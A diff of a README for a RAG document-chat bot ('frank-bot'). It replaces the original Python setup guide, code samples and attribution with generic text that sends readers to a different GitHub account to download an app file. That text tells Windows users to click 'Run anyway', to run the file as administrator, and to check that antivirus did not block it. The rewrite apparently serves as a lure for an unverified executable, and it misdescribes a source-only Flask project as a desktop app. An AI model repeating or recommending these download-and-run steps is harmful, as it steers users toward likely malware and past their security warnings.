@@ -1,230 +1,251 @@
-# Frank Bot 🤖
+# 🤖 frank-bot - Ask Your Docs, Get Clear Answers
 
-**RAG-powered AI assistant for any business. Drop in your documents. Ask Frank anything.**
+[![Download frank-bot](https://img.shields.io/badge/Download-frank--bot-blue?style=for-the-badge)](https://github.com/badressalemmouffek-coder/frank-bot)
 
-Frank is a production-ready AI chatbot platform built on:
-- **ChromaDB** — local vector store, no external embedding API needed
-- **Claude (Anthropic)** — LLM backend
-- **Flask** — lightweight Python web server
-- **Sentence Transformers** — local embeddings (all-MiniLM-L6-v2)
+## 🚀 What frank-bot does
 
-The client supplies their own Anthropic API key. Their documents never leave their server.
+frank-bot is a desktop-style AI assistant for business use. It helps you ask questions about your files, policies, notes, and other company documents.
 
-<img width="2852" height="1378" alt="image" src="https://github.com/user-attachments/assets/d30302b4-4735-4380-ac2a-3b962e4a0172" />
+It uses your documents as the source of truth, so you can get answers that match your own content. It is built with ChromaDB and Claude, which helps it search text and reply in plain language.
 
----
+Use frank-bot to:
 
-## How It Works
+- Ask questions about company documents
+- Find facts in long files without manual searching
+- Help HR teams answer common staff questions
+- Build a private knowledge base for your business
+- Keep answers tied to your own documents
 
-```
-Client uploads docs (PDF/DOCX/TXT)
-         ↓
-Frank chunks + embeds them into ChromaDB (local, self-hosted)
-         ↓
-User asks a question in the chat UI
-         ↓
-RAG engine retrieves top-k relevant chunks
-         ↓
-Claude answers using only the retrieved context
-         ↓
-Grounded, document-based response — no hallucination
-```
-<img width="2805" height="1342" alt="image" src="https://github.com/user-attachments/assets/21b62283-50f2-4adb-b70b-a1cd448df542" />
+## 📥 Download frank-bot
 
----
+Visit this page to download and run the app:
 
-## Architecture
+[https://github.com/badressalemmouffek-coder/frank-bot](https://github.com/badressalemmouffek-coder/frank-bot)
 
-```
-frank-bot/
-├── run_bot.py              # Universal entrypoint (systemd / Docker)
-├── shared/
-│   ├── frank_bot.py        # FrankBot class — Flask app, all endpoints, chat UI
-│   ├── rag_engine.py       # ChromaDB RAG store — chunk, embed, retrieve, build context
-│   └── bot_config.py       # BotConfig schema — tier limits, add-ons, env loading
-├── clients/
-│   └── vertical_prompts.py # 12 industry-tuned prompt personalities (Layer 1/2/3 system)
-├── examples/
-│   └── demo_config.json    # Example bot config
-└── docs/
-    └── SETUP.md            # Deployment guide
-```
-<img width="2742" height="1235" alt="image" src="https://github.com/user-attachments/assets/bc305a9a-6cee-41e5-915e-38bcaf1811b4" />
+## 🪟 Windows setup
 
----
+Follow these steps on Windows:
 
-## Vertical Personalities
+1. Open the download link above in your browser.
+2. Download the latest release or app file from the repository page.
+3. If the file comes in a ZIP folder, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Find the app file and double-click it to run.
+6. If Windows asks for permission, choose **Run anyway** if you trust the source.
+7. Wait for Frank Bot to start.
 
-Frank ships with tuned system prompts for 12 industry verticals:
+If the app opens in a browser window or a local web page, keep that window open while you use it.
 
-| Vertical | Description |
-|---|---|
-| 💼 HR & Workplace | Any industry — policy, entitlements, Fair Work |
-| ⛏️ Resources & Mining | FIFO, WHS, EBA, site safety |
-| 🏗️ Construction | SWMS, white card, subcontractors, EBA |
-| 🏥 Aged Care | SIRS, Quality Standards, SCHADS Award |
-| 🏛️ Local Government | Governance, LG Award, PID, procurement |
-| ⚕️ Healthcare | AHPRA, NSQHS, scope of practice |
-| 🎓 Education | Child Safe, mandatory reporting, ASQA |
-| 📊 Finance & Professional | AFS licence, AML/CTF, AFCA |
-| 📋 Project Management | Document retrieval, scope, risk, workstreams |
-| 🦺 Safety & WHS | Notifiable incidents, permits, PCBU duties |
-| 🏗️ Building & Architecture | NCC, DA/CC, drawing interpretation |
-| 🔧 Custom | Fully custom — define your own personality |
+## 🧭 First-time setup
 
-Each vertical uses a layered prompt architecture:
-- **Layer 1** — Universal security, confidentiality, distress protocols (always on)
-- **Layer 2** — Vertical personality and domain knowledge (swappable)
-- **Layer 3** — Client-specific custom instructions (additive only)
+When you open frank-bot for the first time, you may need to set up a few things:
 
----
+- Add your Claude API key
+- Choose the folder with your documents
+- Let the app build its search index
+- Wait for the first scan to finish
 
-## Quick Start
+If you do not have an API key yet, create one from your Anthropic account before you start. Keep it private and paste it into the app when asked.
 
-### 1. Install dependencies
+## 📚 How to add your documents
 
-```bash
-pip install flask anthropic chromadb pdfplumber pypdf python-docx sentence-transformers
-```
+frank-bot works best when you give it clear, text-based files.
 
-### 2. Configure your bot
+Good file types include:
 
-```bash
-cp examples/demo_config.json /opt/frankbot/config.json
-# Edit config.json — set company_name, vertical, bot_id
-```
+- PDF
+- DOCX
+- TXT
+- Markdown files
+- Internal notes
+- Policy docs
+- Employee handbooks
+- Help center articles
 
-### 3. Set your API key
+To add documents:
 
-```bash
-export LLM_API_KEY=sk-ant-...
-```
+1. Open frank-bot.
+2. Choose the folder or files you want to use.
+3. Start the import or scan step.
+4. Wait until the documents finish processing.
+5. Ask a question about the content.
 
-### 4. Run
+For best results, use files with clean text and simple headings.
 
-```bash
-python run_bot.py
-# → http://localhost:8080
-```
+## 💬 How to ask questions
 
----
+Type a question in normal language, just like you would ask a coworker.
 
-## Configuration
+Examples:
 
-All config lives in `config.json` (or environment variables).
+- What is our leave policy?
+- How do I request access to the sales folder?
+- What does the employee handbook say about remote work?
+- Which document explains our onboarding steps?
+- What is the refund policy for enterprise plans?
 
-```json
-{
-  "bot_id": "acme-hr",
-  "bot_name": "Frank",
-  "company_name": "Acme Resources",
-  "vertical": "hr_resources",
-  "tier": "professional",
-  "llm_provider": "anthropic",
-  "llm_model": "claude-haiku-4-5",
-  "rag_enabled": true,
-  "rag_top_k": 15,
-  "max_docs": 30,
-  "max_doc_size_mb": 10,
-  "forms_enabled": true,
-  "port": 8080
-}
-```
+Ask one clear question at a time. If you want a better answer, include the document name or topic in your question.
 
-### Tiers
+## 🧠 How frank-bot works
 
-| Tier | Max Docs | Max Doc Size | Forms |
-|---|---|---|---|
-| Starter | 10 | 5 MB | 1 |
-| Professional | 30 | 10 MB | 3 |
-| Enterprise | 100 | 20 MB | 5 |
+frank-bot follows a simple flow:
 
----
+1. It reads your uploaded documents.
+2. It stores the text in ChromaDB.
+3. It looks for the most relevant passages when you ask a question.
+4. It sends those passages to Claude.
+5. Claude writes a response based on your content.
 
-## RAG Engine
+This setup helps the app give answers that stay close to your source files.
 
-The core of Frank is `shared/rag_engine.py`:
+## 🔍 Best use cases
 
-```python
-from shared.rag_engine import FrankRAGStore
+frank-bot fits teams that need fast answers from internal documents.
 
-store = FrankRAGStore(bot_id="acme-hr", persist_dir="/opt/frankbot/chroma")
+Common use cases:
 
-# Index a document
-store.index_document("Leave Policy", leave_policy_text)
+- HR policy Q&A
+- Employee onboarding help
+- IT support docs
+- Sales playbook lookup
+- Operations manual search
+- Client service knowledge base
+- Private business document search
 
-# Retrieve relevant chunks
-chunks = store.retrieve("how much annual leave do I get?", top_k=5)
+If your team keeps answers in scattered files, frank-bot gives you one place to ask for them.
 
-# Build context string for injection into system prompt
-context = store.build_context("how much annual leave do I get?")
-```
+## 🖥️ System needs
 
-### Key features
+For smooth use on Windows, use a recent computer with:
 
-- **Local embeddings** — sentence-transformers, no external API
-- **Query expansion** — Claude Haiku generates 4 alternative phrasings, merged results
-- **Source boost** — named documents in queries guaranteed to be retrieved
-- **Clean re-index** — re-uploading a document replaces all its chunks atomically
-- **Overlap chunking** — 400-word chunks with 80-word overlap, paragraph-aware
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A stable internet connection
+- Enough space for your documents and search index
+- Access to the Claude API
 
----
+For large document sets, a faster machine will handle indexing and search better.
 
-## Prompt Architecture
+## 🛠️ Common tasks
 
-```python
-from clients.vertical_prompts import get_vertical_personality, get_layer1_always
+### Add new documents
 
-# Build system prompt
-system = f"""
-{get_vertical_personality("hr_resources")}
+When your files change, add the new versions to frank-bot and re-scan them. This keeps answers current.
 
-## Your organisation
-Company: Acme Resources
-Custom instructions: Always refer to the EBA for pay questions.
+### Remove old content
 
-{get_layer1_always()}
+Delete outdated files from the source folder, then rebuild the index so Frank stops using old text.
 
-## Context from documents:
-{context}
-"""
-```
+### Improve answer quality
 
-Layer 1 is injected **last** — it always takes precedence over custom instructions.
+To get cleaner answers:
 
----
+- Use clear file names
+- Keep documents well organized
+- Avoid scanned images with no text
+- Split very large files into smaller topics
+- Write questions with enough detail
 
-## Deployment
+## 🔐 Privacy and control
 
-Frank is designed to run as a systemd service on a Linux VM:
+frank-bot is self-hosted, so you keep control of your documents on your own setup.
 
-```ini
-[Unit]
-Description=Frank Bot — Acme Resources
-After=network.target
+That makes it a good fit for teams that want:
 
-[Service]
-WorkingDirectory=/opt/frankbot/app
-ExecStart=/opt/frankbot/venv/bin/python3 run_bot.py
-Restart=always
-EnvironmentFile=/opt/frankbot/.env
+- Local document control
+- Private internal search
+- A simple setup for staff
+- Fewer manual support questions
 
-[Install]
-WantedBy=multi-user.target
-```
+Your document content stays tied to your own environment and API setup.
 
-One droplet per client. Each bot is isolated — documents, ChromaDB store, and API keys never shared.
+## 🧩 Topics covered
 
----
+This project relates to:
 
-## Built by
+- anthropic
+- document-qa
+- enterprise-ai
+- flask
+- hr-automation
+- llm
+- python
+- rag
+- self-hosted
 
-[LevelUp](https://lvlup.au) — AI systems for Australian workplaces.
+## ❓ Troubleshooting
 
-Frank is deployed across HR, construction, mining, aged care, and local government organisations.
+### The app does not open
 
----
+- Check that the file finished downloading
+- Make sure you extracted the ZIP folder first
+- Try running the app again as an administrator
+- Check that your antivirus did not block the file
 
-## Licence
+### Frank cannot answer questions
 
-MIT
+- Confirm your Claude API key is correct
+- Make sure your documents finished indexing
+- Check that the files contain readable text
+- Try asking a shorter question
+
+### The answers look weak
+
+- Use clearer source documents
+- Add headings to long files
+- Remove duplicate or outdated files
+- Ask more direct questions
+
+### Document import is slow
+
+- Start with a smaller folder
+- Use fewer large files at once
+- Close other heavy apps on your computer
+- Make sure your internet connection is stable
+
+## 📝 Suggested folder setup
+
+A simple folder structure can help:
+
+- HR
+  - Benefits
+  - Leave Policy
+  - Onboarding
+- IT
+  - Access Requests
+  - Device Setup
+- Sales
+  - Pricing
+  - Objections
+- Operations
+  - SOPs
+  - Vendor Rules
+
+This makes it easier for Frank Bot to find the right text.
+
+## 📌 File tips
+
+Use documents that are:
+
+- Easy to read
+- Based on facts
+- Up to date
+- Clearly named
+- Focused on one topic
+
+Avoid files that are:
+
+- Full of images with no text
+- Mixed with unrelated topics
+- Very old or duplicate copies
+- Hard to read because of scans
+
+## 🔗 Project link
+
+Primary download and project page:
+
+[https://github.com/badressalemmouffek-coder/frank-bot](https://github.com/badressalemmouffek-coder/frank-bot)
+
+## 📄 License
+
+Check the repository page for license details before use in your team or business setup
